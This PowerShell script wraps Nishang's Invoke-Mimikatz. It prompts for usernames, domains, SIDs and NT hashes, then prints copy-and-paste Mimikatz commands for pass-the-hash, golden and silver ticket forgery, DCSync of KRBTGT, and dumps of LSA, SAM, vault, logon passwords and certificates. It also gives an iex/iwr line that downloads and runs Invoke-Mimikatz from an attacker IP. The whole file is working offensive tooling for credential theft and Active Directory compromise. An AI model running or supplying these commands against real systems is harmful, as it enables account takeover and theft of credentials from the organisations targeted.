function Mimikatz-Everything
{
<# This script helps with running invoke-mimikatz.ps1 by Nishang it will ask questions throughout that will be used as a copy and paste

for someone to be able to run differnet invoke-mimikatz commands the following switches below can be used one at a time
#>
	[cmdletbinding()] Param
	(
        
        [Parameter(Position = 0, Mandatory = $False)]
        [string]
        $AttackerIP,

        [Parameter(ParameterSetName="Privilege")]
        [Switch]
        $Privilege,

        [Parameter(ParameterSetName="PTH")]
        [Switch]
        $PTH,

        [Parameter(ParameterSetName="DCSYNC")]
        [Switch]
        $DCSYNC,

        [Parameter(ParameterSetName="Vault")]
        [Switch]
        $Vault,

        [Parameter(ParameterSetName="LSA")]
        [Switch]
        $LSA,

        [Parameter(ParameterSetName="SEKURLSA")]
        [Switch]
        $SEKURLSA,

        [Parameter(ParameterSetName="Certificate")]
        [Switch]
        $Certificate,

        [Parameter(ParameterSetName="Golden")]
        [Switch]
        $Golden,

        [Parameter(ParameterSetName="Silver")]
        [Switch]
        $Silver

    )

	if ($AttackerIP)
	{
		write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Putting mimikatz in memory please ensure python is started on $AttackerIP and that web server has Invoke-Mimikatz.ps1"
	}
	else
	{
		
	}

	if ($PTH)
	{
		$User = Read-Host -Prompt 'Input Username'
      	$Domain = Read-Host -Prompt 'Input Domain Name'
      	$NTLM = Read-Host -Prompt 'Input NT Hash'
        $AttackerIP = Read-Host -Prompt 'Input Attacker IP'
      	write-host -foregroundcolor yellow -backgroundcolor black "Input the following command after putting Invoke-Mimikatz into memory with command iex (iwr -usebasicparsing http://$AttackerIP/Invoke-Mimikatz.ps1)"
      	write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""sekurlsa::pth /user:$User /domain:$Domain /ntlm:$NTLM /run:powershell.exe""'"

    }
        else
        {
            
        }

    if ($Golden)
    {
        $User = Read-Host -Prompt 'Input Username, does not need to be real or can be administrator'
        $Domain = Read-Host -Prompt 'Input Domain Name'
        $SID = $Domain = Read-Host -Prompt 'Input SID'
        $NTLM = Read-Host -Prompt 'Input KRBTGT NT Hash'
        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""kerberos::golden /user:$User /domain:$Domain /sid:$SID /KRBTGT:$ntlm /id:500 /groups:512 /ptt""'"
    }

    else
    {

    }

    if ($Silver)
    {
        $User = Read-Host -Prompt 'Input Username, does not need to be real or can be administrator'
        $Domain = Read-Host -Prompt 'Input Domain Name'
        $SID = $Domain = Read-Host -Prompt 'Input SID'
        $Target = Read-Host -Prompt 'Input Target such as domain controller example dcorp-dc.domain.local'
        $Service = Read-Host -Prompt 'Input Service such as CIFS'
        $RC4 = Read-Host -Prompt 'Input RC4 Hash'
        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""kerberos::golden /domain:$Domain /sid:$sid /target:$Target /service:$Service /rc4:$RC4 /user:$User /ptt""'"
    }
    else
    {

    }
   
            if ($DCSYNC)
      		
      		{
      			
      			write-host -foregroundcolor yellow -backgroundcolor black "You may need to run the following first to get the information needed"
      			write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""lsadump::lsa /patch""'"	
      			$User = Read-Host -Prompt 'Input Username (Usually KRBTGT for this attack)'
      			$Domain = Read-Host -Prompt 'Input Domain Name'
      			write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""lsadump::dcsync /user:$Domain\$User""'"

      		}
      		else
      		{
      			
      		}
    
    if ($Vault)
    {
        write-host -foregroundcolor yellow -backgroundcolor black "Vault /patch may be dangerous to run on some systems, for this reason the script will ask you to ensure you want to run that command"
        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""vault::list" "vault::cred""'"

        $confirmation = Read-Host "Do you want to run vault::cred /patch (Y/N)?:"
      if ($confirmation -eq 'y')

        {
        
        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""vault::cred /patch""'"
        
        }
    }
    else
    {
        
    }
    
    if ($LSA)
    {
        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""lsadump::lsa"" ""lsadump::lsa /patch"" ""lsadump::secrets"" ""lsadump::cache"" ""lsadump::sam""'"
    }
    else
    {
        
    }

    if ($SEKURLSA)
    {
        write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""sekurlsa::logonpasswords"" ""sekurlsa::tickets /export"" ""sekurlsa::ekeys"" ""sekurlsa::dpapi""'"
    }
    else
    {
        
    }

    if ($Certificate)
    {
    $confirmation = Read-Host "Can be extremely dangerous, are you sure (Y/N)?:"
      if ($confirmation -eq 'y')

        {
            write-host -foregroundcolor green -backgroundcolor black "Invoke-Mimikatz -command '""crypto::certificates /systemstore:local_machine""'"
        }
    }

    else 
    {
        
    }
}